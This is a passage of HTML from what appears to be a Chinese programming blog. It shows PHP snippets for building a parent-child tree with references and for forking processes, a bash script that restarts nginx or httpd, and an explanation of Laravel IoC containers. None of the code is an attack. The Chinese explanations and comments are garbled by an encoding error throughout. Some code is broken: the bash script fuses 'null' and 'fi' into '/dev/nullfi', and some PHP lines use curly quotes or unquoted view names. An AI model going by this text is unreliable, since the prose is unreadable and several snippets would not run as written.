class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">5</span></span><br><span class="line">                                            [title] =&gt; title5</span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_tree</span>(<span class="params">$array</span>) </span>&#123;</span><br><span class="line">    $result = array();</span><br><span class="line">    $tmp = array();</span><br><span class="line">    foreach($array <span class="keyword">as</span> $item) &#123;</span><br><span class="line">      <span class="keyword">if</span>($item[<span class="string">'parent_id'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        $i = count($result);</span><br><span class="line">        $result[$i] = $item;</span><br><span class="line">        $id = $item[<span class="string">'id'</span>];</span><br><span class="line">        $tmp[$id] = &amp;$result[$i];<span class="comment">//è¿™ä¸€å¥ä¿è¯äº†å½“æ— è®º$tmp[$id]è¿˜æ˜¯$result[$i]å‘ç”Ÿå˜åŒ–ï¼Œéƒ½ä¼šè®©å¦å¤–ä¸€ä¸ªå€¼åŒæ—¶å‘ç”Ÿå˜åŒ–ã€‚è€Œ $tmp[$parent_id]['children'][$i] = $item; å®é™…ä¸Šå¯¼è‡´$result[$parent_id]å‘ç”Ÿäº†å˜åŒ–ã€‚</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        $id = $item[<span class="string">'id'</span>];</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        $parent = $tmp[$parent_id];</span><br><span class="line">        $i = count($parent[<span class="string">'children'</span>]);</span><br><span class="line">        $tmp[$parent_id][<span class="string">'children'</span>][$i] = $item;</span><br><span class="line">        $tmp[$id] = &amp;$tmp[$parent_id][<span class="string">'children'</span>][$i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line">  å½“$b = &amp;$aæ—¶ï¼Œ$bå’Œ$aåŒæ—¶å¼•ç”¨åŒä¸€ä¸ªå†…å®¹ï¼ˆæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜ï¼‰ï¼Œæ— è®º$aæˆ–$bè°å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå†…å®¹éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿›è€Œå‘ˆç°ä¸º$aå’Œ$bä¿æŒåŒæ­¥çš„å˜åŒ–ã€‚</span><br><span class="line">  https:<span class="comment">//www.tangshuang.net/1701.html</span></span><br><span class="line">  print_r(array_tree($demo1));</span><br><span class="line">    <span class="built_in">Array</span></span><br><span class="line">    (</span><br><span class="line">        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">            (</span><br><span class="line">                [id] =&gt; <span class="number">1</span></span><br><span class="line">                [title] =&gt; title1</span><br><span class="line">                [parent_id] =&gt; <span class="number">0</span></span><br><span class="line">                [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                    (</span><br><span class="line">                        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                            (</span><br><span class="line">                                [id] =&gt; <span class="number">2</span></span><br><span class="line">                                [title] =&gt; title2</span><br><span class="line">                                [parent_id] =&gt; <span class="number">1</span></span><br><span class="line">                                [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                    (</span><br><span class="line">                                        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                            (</span><br><span class="line">                                                [id] =&gt; <span class="number">4</span></span><br><span class="line">                                                [title] =&gt; title4</span><br><span class="line">                                                [parent_id] =&gt; <span class="number">2</span></span><br><span class="line">                                            )</span><br><span class="line">    </span><br><span class="line">                                        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                            (</span><br><span class="line">                                                [id] =&gt; <span class="number">5</span></span><br><span class="line">                                                [title] =&gt; title5</span><br><span class="line">                                                [parent_id] =&gt; <span class="number">2</span></span><br><span class="line">                                            )</span><br><span class="line">    </span><br><span class="line">                                    )</span><br><span class="line">    </span><br><span class="line">                            )</span><br><span class="line">    </span><br><span class="line">                        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                            (</span><br><span class="line">                                [id] =&gt; <span class="number">3</span></span><br><span class="line">                                [title] =&gt; title3</span><br><span class="line">                                [parent_id] =&gt; <span class="number">1</span></span><br><span class="line">                            )</span><br><span class="line">    </span><br><span class="line">                    )</span><br><span class="line">    </span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">            (</span><br><span class="line">                [id] =&gt; <span class="number">6</span></span><br><span class="line">                [title] =&gt; title6</span><br><span class="line">                [parent_id] =&gt; <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">    )</span><br><span class="line">    $tmp[$id] = &amp;$tmp[$parent_id][<span class="string">'children'</span>][$i];è¿™ä¸€å¥èµ·åˆ°äº†å…³é”®æ€§ä½œç”¨ã€‚åŠ ä¸Šè¿™ä¸€å¥ä¹‹åï¼Œæˆ‘ä»¬å†æ¥è·‘ä¸€éarray(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)è¿™ä¸ªå…ƒç´ ã€‚</span><br><span class="line">    </span><br><span class="line">    [<span class="number">2</span>]=&gt; array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...)</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...)  <span class="comment">// é‡æ–°ä»â‘ å¼€å§‹æ¼”ç¤º</span></span><br><span class="line">    </span><br><span class="line">    $result[<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...) <span class="comment">// å†…éƒ¨ç»“æœ</span></span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">12</span>] = &amp;$tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>]  <span class="comment">// ç¬¬äºŒä¸ª&amp;å‡ºç°äº†</span></span><br><span class="line">    </span><br><span class="line">    [<span class="number">5</span>]=&gt; array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">12</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)</span><br><span class="line">    </span><br><span class="line">    ç”±äºç¬¬äºŒä¸ª&amp;å¼•ç”¨çš„åŸå› ï¼Œå®é™…ä¸Šå‘ç”Ÿäº†ï¼š</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...) <span class="comment">// å†…éƒ¨ç»“æœ</span></span><br><span class="line">    </span><br><span class="line">    $result[<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...) <span class="comment">// å†…éƒ¨ç»“æœ</span></span><br><span class="line">    è¿™ä¸ªæ—¶å€™ä½ å¯èƒ½å·²ç»çœ‹å‡ºäº†ç«¯å€ªã€‚çˆ¶å­å…³ç³»å˜æˆäº† <span class="number">5</span> &gt; <span class="number">12</span> &gt; <span class="number">23</span>ï¼Œè€Œè¿™ç»„å…³ç³»ï¼Œå…¨éƒ¨å­˜å‚¨åœ¨äº†id=<span class="number">5</span>çš„è¿™ä¸ªé¡¶çº§å…ƒç´ ä¸­ï¼Œä»¥å¤šé‡çš„childrenå…ƒç´ å®ç°äº†çˆ¶å­å­™ç»“æ„ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="PHPè¿›ç¨‹åˆ†æ”¯è®¾è®¡"><a href="#PHPè¿›ç¨‹åˆ†æ”¯è®¾è®¡" class="headerlink" title="PHPè¿›ç¨‹åˆ†æ”¯è®¾è®¡"></a>PHPè¿›ç¨‹åˆ†æ”¯è®¾è®¡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/tangshuang/php-events-async-callback https://www.tangshuang.net/2086.html</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"><span class="keyword">if</span>($pid &gt; <span class="number">0</span>)&#123; <span class="comment">//çˆ¶è¿›ç¨‹ä»£ç </span></span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">elseif($pid == <span class="number">0</span>) &#123; <span class="comment">//å­è¿›ç¨‹ä»£ç </span></span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">ä½ ä¼šå‘ç°httpdæˆ–php-fpmçš„è¿›ç¨‹ä¼šå¢åŠ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œpcntlå…¶å®æ˜¯é€šè¿‡é‡æ–°å¼€å¯phpè¿›ç¨‹ï¼Œå¹¶é€šè¿‡å…¶ä»–æœºåˆ¶å®ç°è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡çš„ã€‚</span><br><span class="line">proc_openï¼Œpopenä¹Ÿæ˜¯åˆ©ç”¨httpdæ¥å®ç°å¤šè¿›ç¨‹</span><br><span class="line"></span><br><span class="line">$proc=proc_open(<span class="string">"echo foo"</span>, array(  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"r"</span>),  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"w"</span>),  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"w"</span>)</span><br><span class="line">), $pipes);  </span><br><span class="line">print stream_get_contents($pipes[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span> <span class="string">'Events.php'</span>;</span><br><span class="line"><span class="built_in">require</span> <span class="string">'EventListener.class.php'</span>;</span><br><span class="line"></span><br><span class="line">$EventListener = <span class="keyword">new</span> EventListener(<span class="string">'timeout'</span>);</span><br><span class="line">$EventListener-&gt;add(<span class="string">'timeout'</span>,<span class="string">'setTimeout'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setTimeout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  file_put_contents(<span class="string">'./log.txt'</span>,<span class="string">'å»¶æ—¶å›è°ƒæˆåŠŸï¼Œç°åœ¨æ—¶é—´ï¼š'</span>.date(<span class="string">'Y-m-d H:i:s'</span>),FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ è‡ªå·±çš„ä»£ç æµç¨‹https://github.com/tangshuang/php-events-async-callback</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">'./log.txt'</span>,<span class="string">'å»¶æ—¶æ“ä½œå¼€å§‹ï¼Œç°åœ¨æ—¶é—´ï¼š'</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"\r"</span>,LOCK_EX);</span><br><span class="line">$EventListener-&gt;run(<span class="string">'timeout'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="shellé‡å¯æœåŠ¡"><a href="#shellé‡å¯æœåŠ¡" class="headerlink" title="shellé‡å¯æœåŠ¡"></a>shellé‡å¯æœåŠ¡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åœ¨shellè„šæœ¬ä¸­å¯¹æœåŠ¡è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœnginxæˆ–è€…httpdå®•æœºäº†ï¼Œå°±æ‰§è¡Œä¸€æ¡é‡å¯å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">#nginx</span><br><span class="line">ps -ef | grep nginx |grep -v grep &gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ $? != <span class="number">0</span> ];then</span><br><span class="line">       service nginx restart &gt; <span class="regexp">/dev/</span>nullfi</span><br><span class="line">#httpd</span><br><span class="line">ps -ef | grep httpd |grep -v grep &gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ $? != <span class="number">0</span> ];then</span><br><span class="line">       service httpd restart &gt; <span class="regexp">/dev/</span>nullfi</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-IoC-æœåŠ¡å®¹å™¨ç±»ç®¡ç†å·¥å…·"><a href="#Laravel-IoC-æœåŠ¡å®¹å™¨ç±»ç®¡ç†å·¥å…·" class="headerlink" title="Laravel IoC æœåŠ¡å®¹å™¨ç±»ç®¡ç†å·¥å…·"></a>Laravel IoC æœåŠ¡å®¹å™¨ç±»ç®¡ç†å·¥å…·</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">é«˜å±‚æ¬¡çš„æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¬¡çš„æ¨¡å—ï¼Œä¸¤è€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡æ¥å£ã€‚</span><br><span class="line"></span><br><span class="line">æŠ½è±¡æ¥å£ä¸åº”è¯¥ä¾èµ–äºå…·ä½“å®ç°ã€‚è€Œå…·ä½“å®ç°åˆ™åº”è¯¥ä¾èµ–äºæŠ½è±¡æ¥å£ã€‚</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQLConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * æ•°æ®åº“è¿æ¥</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      var_dump(â€˜MYSQL Connectionâ€™);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordReminder</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @var MySQLConnection</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     private $dbConnection;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">MySQLConnection $dbConnection</span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;dbConnection = $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">å¤§å®¶å¸¸å¸¸ä¼šæœ‰ä¸€ä¸ªè¯¯è§£ï¼Œé‚£å°±æ˜¯ä¾èµ–åè½¬å°±åªæ˜¯ä¾èµ–æ³¨å…¥çš„å¦ä¸€ç§è¯´æ³•ã€‚ä½†å…¶å®äºŒè€…æ˜¯ä¸åŒçš„ã€‚åœ¨ä¸Šé¢çš„ä»£ç ç¤ºä¾‹ä¸­ï¼Œå°½ç®¡åœ¨ PasswordReminder ç±»ä¸­æ³¨å…¥äº† MySQLConnection ç±»ï¼Œä½†å®ƒè¿˜æ˜¯ä¾èµ–äº MySQLConnection ç±»ã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œé«˜å±‚æ¬¡æ¨¡å— PasswordReminder æ˜¯ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¬¡æ¨¡å— MySQLConnection çš„ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœæˆ‘ä»¬æƒ³è¦æŠŠ MySQLConnection æ”¹æˆ MongoDBConnectionï¼Œé‚£æˆ‘ä»¬å°±è¿˜å¾—æ‰‹åŠ¨ä¿®æ”¹ PasswordReminder ç±»æ„é€ å‡½æ•°é‡Œçš„ä¾èµ–ã€‚</span><br><span class="line"></span><br><span class="line">interface ConnectionInterface</span><br><span class="line">&#123;</span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">DbConnection</span> <span class="title">implements</span> <span class="title">ConnectionInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * æ•°æ®åº“è¿æ¥</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   var_dump(â€˜MYSQL Connectionâ€™);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordReminder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @var DBConnection</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    private $dbConnection;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">ConnectionInterface $dbConnection</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;dbConnection = $dbConnection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> IoC å®¹å™¨ç®€å•åœ°ç†è§£ä¸ºå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œé‡Œé¢è£…çš„æ˜¯ç±»çš„ä¾èµ–ã€‚</span><br><span class="line">namespace App\Repositories;</span><br><span class="line"></span><br><span class="line">interface OrderRepositoryInterface </span><br><span class="line">&#123;</span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"><span class="title">namespace</span> <span class="title">App</span>\<span class="title">Repositories</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">DbOrderRepository</span> <span class="title">implements</span> <span class="title">OrderRepositoryInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Getting all from mysql'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\Http\Requests;</span><br><span class="line">use App\Repositories\OrderRepositoryInterface;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrdersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $order;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">OrderRepositoryInterface $order</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     $<span class="keyword">this</span>-&gt;order = $order;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     dd($<span class="keyword">this</span>-&gt;order-&gt;getAll());</span><br><span class="line">     <span class="keyword">return</span> View::make(orders.index);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">Route::resource(<span class="string">'orders'</span>, <span class="string">'OrdersController'</span>);</span><br><span class="line">App::bind(<span class="string">'App\Repositories\OrderRepositoryInterface'</span>, <span class="string">'App\Repositories\DbOrderRepository'</span>);</span><br><span class="line">å®šä¹‰ä¸€ä¸ªå®¹å™¨ç±»ï¼š</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleContainer</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    protected <span class="keyword">static</span> $container = [];</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">$name, Callable $resolver</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">static</span>::$container[$name] = $resolver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(isset(<span class="keyword">static</span>::$container[$name]))&#123;</span><br><span class="line">        $resolver = <span class="keyword">static</span>::$container[$name] ;</span><br><span class="line">        <span class="keyword">return</span> $resolver();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Binding does not exist in containeer"</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogToDatabase</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$message</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       var_dump(<span class="string">'log the message to a database :'</span>.$message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 